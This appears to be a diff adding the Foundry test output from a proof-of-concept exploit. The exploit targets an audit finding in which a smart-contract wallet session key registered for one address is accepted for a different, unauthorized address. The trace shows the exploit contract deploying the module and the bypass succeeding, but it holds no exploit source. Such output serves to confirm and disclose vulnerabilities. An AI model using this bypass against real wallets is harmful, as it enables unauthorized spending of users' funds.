@@ -1,0 +1,26 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/61396-h-01-session-key-can-be-consumed-by-unauthorized-scw-shieldi_exp.sol:PoC_61396
+[PASS] test_exploit() (gas: 710473)
+Traces:
+  [710473] PoC_61396::test_exploit()
+    ├─ [411047] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 2053 bytes of code
+    ├─ [266300] Exploit::run()
+    │   ├─ [184624] → new SessionModule@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   └─ ← [Return] 922 bytes of code
+    │   ├─ [22838] SessionModule::install(0x0e42f327ee3cfa7ccfc084a0bb68d05eb627610303012a67afbf1ecd9b0d32fa, 0x0000000000000000000000000000000000001111)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xbf7170474fee88bb8abeb713b2d2da543a7d386c5a7aba263ad0de73f5bf202a: 0 → 4369
+    │   │   └─ ← [Stop]
+    │   ├─ [1325] SessionModule::validate(0x0e42f327ee3cfa7ccfc084a0bb68d05eb627610303012a67afbf1ecd9b0d32fa, 0x0000000000000000000000000000000000002222) [staticcall]
+    │   │   └─ ← [Return] true
+    │   ├─ emit Proof(accepted: true)
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 1
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 338.42µs (166.83µs CPU time)
+
+Ran 1 test suite in 4.84ms (338.42µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
